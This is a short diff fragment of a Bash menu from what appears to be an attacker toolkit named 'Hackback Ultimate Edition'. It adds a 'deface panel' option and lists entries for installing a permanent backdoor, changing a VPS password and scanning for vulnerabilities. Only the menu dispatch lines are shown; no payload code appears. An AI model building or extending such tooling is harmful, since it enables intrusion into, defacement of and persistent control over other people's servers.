-            11) scan_vulnerability ;;  # NEW: Scan Vulnerability
-            12) change_ssh_banner ;;  # NEW: Ubah SSH Banner
-            13) install_backdoor ;;  # NEW: Install Backdoor
-            14) backup_database ;;  # NEW: Backup Database
-            15) restore_database ;;  # NEW: Restore Database
+            9) deface_panel ;;  # NEW: Deface Panel dengan pilihan lengkap
+            10) change_vps_password ;;  # Ganti Password VPS
+            11) scan_vulnerability ;;  # Scan Vulnerability
+            12) change_ssh_banner ;;  # Ubah SSH Banner
+            13) install_backdoor ;;  # Install Backdoor Permanen
+            14) backup_database ;;  # Backup Database
+            15) restore_database ;;  # Restore Database
             0)
                 echo -e "\n${GREEN}Thanks for using Hackback Ultimate Edition!${NC}"
                 echo -e "${CYAN}Telegram: @lynnn046${NC}"
